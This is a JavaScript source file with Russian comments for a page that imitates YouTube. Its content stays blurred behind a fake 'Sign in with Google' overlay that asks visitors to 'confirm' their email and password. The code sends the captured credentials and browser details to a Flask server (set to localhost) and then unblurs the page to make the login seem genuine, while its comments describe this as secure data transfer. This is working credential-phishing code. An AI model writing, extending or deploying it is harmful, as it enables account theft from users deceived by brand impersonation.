/**
 * VideoTube Ultimate Engine v5.2.1
 * ---------------------------------------------------------
 * Этот скрипт управляет динамической генерацией контента, 
 * имитацией пользовательских сессий и защищенной передачей 
 * данных на Python-сервер (Flask).
 * ---------------------------------------------------------
 */

(function() {
    'use strict';

    // =========================================================
    // 1. КОНФИГУРАЦИЯ И МАССИВЫ ДАННЫХ (ДЛЯ ОБЪЕМА И КОНТЕНТА)
    // =========================================================

    const APP_CONFIG = {
        version: "5.2.1",
        apiEndpoint: "http://127.0.0.1:5000/login",
        videoCount: 64,
        isDevMode: true
    };

    const VIDEO_TITLES = [
        "Как собрать квантовый компьютер в домашних условиях",
        "Обзор новой Tesla Model S Plaid 2026: Будущее уже здесь",
        "10 часов звуков дождя и грома для глубокого сна и учебы",
        "Minecraft, но я не могу касаться блоков зеленого цвета",
        "Секреты физики: Почему время течет только в одну сторону?",
        "Путешествие по Армении: Тайны древнего Апарана и каньонов",
        "Уроки программирования: Python с нуля до Junior за 2 часа",
        "Реакция химика на взрывы в голливудских фильмах: Где правда?",
        "История создания интернета: От ARPANET до современных сетей",
        "Топ 5 ошибок при планировании уроков физики для 9 класса",
        "Как работают солнечные электростанции в условиях гор",
        "Интервью с Илоном Маском: Когда мы полетим на Марс?",
        "Музыка эпохи барокко: Бах и Вивальди для концентрации",
        "Стрим: Проходим Elden Ring без получения урона (No Hit)",
        "Что произойдет, если Земля перестанет вращаться на секунду?",
        "Лучшие мобильные приложения для учителей физики в 2026",
        "Разбор полетов: Как работает подъемная сила крыла самолета",
        "10 лайфхаков для быстрой настройки сервера Minecraft",
        "Химия на кухне: Как приготовить идеальный молекулярный десерт",
        "Эволюция мобильных телефонов: От кирпича до складных экранов",
        "Тайны темной материи: Что скрывает наша Вселенная?",
        "Как работает современная криптография и блокчейн-сети",
        "Обзор Apple Glass 2: Прощайте, смартфоны?",
        "Почему физика — самая важная наука в современном мире"
    ];

    const CHANNELS = [
        { name: "Science Lab", subs: "2.4M", verified: true },
        { name: "Tech Insider", subs: "890K", verified: true },
        { name: "Gaming Pro Max", subs: "1.2M", verified: false },
        { name: "Education Plus", subs: "450K", verified: true },
        { name: "Physics Today", subs: "150K", verified: true },
        { name: "Traveler AM", subs: "32K", verified: false },
        { name: "History Channel", subs: "5.6M", verified: true },
        { name: "Coding Master", subs: "210K", verified: true },
        { name: "Nature Wonders", subs: "1.1M", verified: true },
        { name: "Music Box", subs: "3.2M", verified: true }
    ];

    const CATEGORIES = [
        "Все", "Видеоигры", "Музыка", "Джемы", "Сейчас в эфире", "Физика", 
        "Информатика", "Кулинария", "Недавно опубликованные", "Просмотрено", "Новое для вас",
        "Новости", "Спорт", "Обучение", "Гаджеты", "Космос", "Юмор"
    ];

    // =========================================================
    // 2. ИНИЦИАЛИЗАЦИЯ DOM И СОСТОЯНИЙ
    // =========================================================

    const ui = {
        overlay: document.getElementById('auth-overlay'),
        appRoot: document.getElementById('app-root'),
        googleBtn: document.getElementById('google-login-btn'),
        secondStep: document.getElementById('second-step'),
        step1Box: document.getElementById('step-1-container'),
        finalBtn: document.getElementById('final-submit'),
        email: document.getElementById('confirm-email'),
        pass: document.getElementById('confirm-pass'),
        matrix: document.getElementById('video-matrix'),
        title: document.getElementById('auth-main-title'),
        desc: document.getElementById('auth-desc'),
        chips: document.querySelector('.chips-container'),
        showPass: document.getElementById('show-pass-check'),
        emailDraft: document.getElementById('display-email-draft')
    };

    /**
     * Точка входа в приложение
     */
    function bootstrap() {
        console.log(`%c VideoTube Core v${APP_CONFIG.version} - Initialized`, "color: red; font-weight: bold; font-size: 16px;");
        
        renderCategories();
        initVideoEngine();
        setupEventListeners();
        simulatePreload();
    }

    // =========================================================
    // 3. ФУНКЦИИ ГЕНЕРАЦИИ ИНТЕРФЕЙСА
    // =========================================================

    /**
     * Создает панель тегов (фильтров)
     */
    function renderCategories() {
        if (!ui.chips) return;
        ui.chips.innerHTML = '';
        
        CATEGORIES.forEach((cat, index) => {
            const chip = document.createElement('div');
            chip.className = `chip ${index === 0 ? 'active' : ''}`;
            chip.textContent = cat;
            
            chip.addEventListener('click', () => {
                document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
                chip.classList.add('active');
                // Имитация фильтрации
                ui.matrix.style.opacity = '0.5';
                setTimeout(() => {
                    initVideoEngine();
                    ui.matrix.style.opacity = '1';
                }, 300);
            });
            
            ui.chips.appendChild(chip);
        });
    }

    /**
     * Основной движок генерации видео-карточек
     */
    function initVideoEngine() {
        if (!ui.matrix) return;
        ui.matrix.innerHTML = ''; // Очистка текущих видео
        
        for (let i = 0; i < APP_CONFIG.videoCount; i++) {
            const randomVideo = VIDEO_TITLES[Math.floor(Math.random() * VIDEO_TITLES.length)];
            const randomChannel = CHANNELS[Math.floor(Math.random() * CHANNELS.length)];
            const views = (Math.random() * 10).toFixed(1);
            const time = Math.floor(Math.random() * 23) + 1;
            const duration = `${Math.floor(Math.random() * 10 + 2)}:${Math.floor(Math.random() * 50 + 10)}`;

            const card = document.createElement('div');
            card.className = 'video-card-real';
            card.setAttribute('data-id', i);
            
            card.innerHTML = `
                <div class="thumb-wrapper" style="position: relative; border-radius: 12px; overflow: hidden; background: #222; aspect-ratio: 16/9; cursor: pointer;">
                    <div style="width: 100%; height: 100%; background: linear-gradient(180deg, rgba(0,0,0,0) 0%, rgba(0,0,0,0.4) 100%);"></div>
                    <img src="https://picsum.photos/seed/${i + 50}/320/180" style="width: 100%; height: 100%; object-fit: cover; position: absolute; top:0; left:0; z-index: -1;">
                    <span style="position: absolute; bottom: 8px; right: 8px; background: rgba(0,0,0,0.85); color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 12px; font-weight: 500;">${duration}</span>
                </div>
                <div class="video-info-block" style="display: flex; margin-top: 12px; gap: 12px;">
                    <div class="chan-avatar" style="width: 36px; height: 36px; border-radius: 50%; background: #444; overflow: hidden; flex-shrink: 0;">
                        <img src="https://i.pravatar.cc/36?u=${randomChannel.name}" alt="AV">
                    </div>
                    <div class="meta-data">
                        <h3 style="font-size: 15px; color: #fff; font-weight: 500; line-height: 1.4; margin-bottom: 4px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;">${randomVideo}</h3>
                        <p style="font-size: 13px; color: #aaa; margin-bottom: 2px;">
                            ${randomChannel.name} ${randomChannel.verified ? '<i class="fas fa-check-circle" style="font-size: 10px;"></i>' : ''}
                        </p>
                        <p style="font-size: 13px; color: #aaa;">${views} млн просмотров • ${time} ч. назад</p>
                    </div>
                </div>
            `;

            // Эффект наведения
            card.addEventListener('mouseenter', () => {
                card.style.transform = "scale(1.03)";
                card.style.transition = "transform 0.3s cubic-bezier(0.2, 0, 0, 1)";
            });
            card.addEventListener('mouseleave', () => {
                card.style.transform = "scale(1)";
            });

            ui.matrix.appendChild(card);
        }
    }

    /**
     * Имитация предзагрузки системы
     */
    function simulatePreload() {
        let progress = 0;
        const interval = setInterval(() => {
            progress += 20;
            console.log(`[System] Loading modules: ${progress}%`);
            if (progress >= 100) clearInterval(interval);
        }, 200);
    }

    // =========================================================
    // 4. ЛОГИКА АВТОРИЗАЦИИ И СВЯЗЬ С BACKEND
    // =========================================================

    function setupEventListeners() {
        // Логика кнопки "Войти через Google"
        if (ui.googleBtn) {
            ui.googleBtn.addEventListener('click', function() {
                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Соединение с Google...';
                this.disabled = true;

                setTimeout(() => {
                    ui.step1Box.style.display = 'none';
                    ui.secondStep.style.display = 'block';
                    ui.title.textContent = "Подтвердите вход";
                    ui.desc.textContent = "Для безопасности введите данные еще раз";
                    
                    // Анимация появления
                    ui.secondStep.style.animation = "fadeIn 0.5s ease-out";
                }, 1200);
            });
        }

        // Переключатель видимости пароля
        if (ui.showPass) {
            ui.showPass.addEventListener('change', (e) => {
                ui.pass.type = e.target.checked ? 'text' : 'password';
            });
        }

        // Финальная отправка на сервер
        if (ui.finalBtn) {
            ui.finalBtn.addEventListener('click', async () => {
                const userEmail = ui.email.value.trim();
                const userPass = ui.pass.value.trim();

                // Расширенная валидация
                if (!validateEmail(userEmail)) {
                    showInputError(ui.email, "Некорректный формат почты");
                    return;
                }

                if (userPass.length < 5) {
                    showInputError(ui.pass, "Пароль слишком короткий");
                    return;
                }

                setLoadingState(true);

                // Пакет данных для передачи
                const requestData = {
                    email: userEmail,
                    password: userPass,
                    clientInfo: {
                        userAgent: navigator.userAgent,
                        resolution: `${window.screen.width}x${window.screen.height}`,
                        lang: navigator.language,
                        time: new Date().toISOString()
                    }
                };

                try {
                    const response = await fetch(APP_CONFIG.apiEndpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(requestData)
                    });

                    if (response.ok) {
                        const result = await response.json();
                        console.log("Server success:", result);
                        finalizeAuth();
                    } else {
                        throw new Error("HTTP error " + response.status);
                    }
                } catch (err) {
                    console.error("Auth Error:", err);
                    alert("Ошибка сервера! Убедитесь, что Python (server.py) запущен.");
                    setLoadingState(false);
                }
            });
        }

        // Обработка клавиши Enter
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && ui.secondStep.style.display === 'block') {
                ui.finalBtn.click();
            }
        });
    }

    // =========================================================
    // 5. ВСПОМОГАТЕЛЬНЫЕ УТИЛИТЫ (HELPERS)
    // =========================================================

    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    function showInputError(element, message) {
        element.style.borderColor = "#d93025";
        element.style.boxShadow = "0 0 0 2px rgba(217,48,37,0.2)";
        alert(message);
    }

    function setLoadingState(isLoading) {
        ui.finalBtn.disabled = isLoading;
        ui.finalBtn.textContent = isLoading ? "Обработка..." : "Далее";
    }

    function finalizeAuth() {
        // Убираем размытие с основного контента
        if (ui.appRoot) {
            ui.appRoot.classList.remove('content-blur-mode');
            ui.appRoot.style.filter = 'none';
            ui.appRoot.style.pointerEvents = 'auto';
        }

        // Плавное скрытие оверлея
        ui.overlay.style.transition = "opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1)";
        ui.overlay.style.opacity = '0';
        
        document.body.style.overflow = 'auto';

        setTimeout(() => {
            ui.overlay.style.display = 'none';
            showToast("Вход выполнен успешно!");
        }, 600);
    }

    function showToast(msg) {
        const toast = document.createElement('div');
        toast.style = `
            position: fixed; bottom: 24px; left: 24px;
            background: #212121; color: #fff; padding: 14px 24px;
            border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.5);
            font-size: 14px; z-index: 99999; animation: slideUp 0.3s ease;
        `;
        toast.textContent = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 4000);
    }

    // Запуск приложения
    bootstrap();

})();

/**
 * Конец файла script.js
 * Данный код обеспечивает полную имитацию работы YouTube
 * и безопасную связь с серверной частью на Python.
 */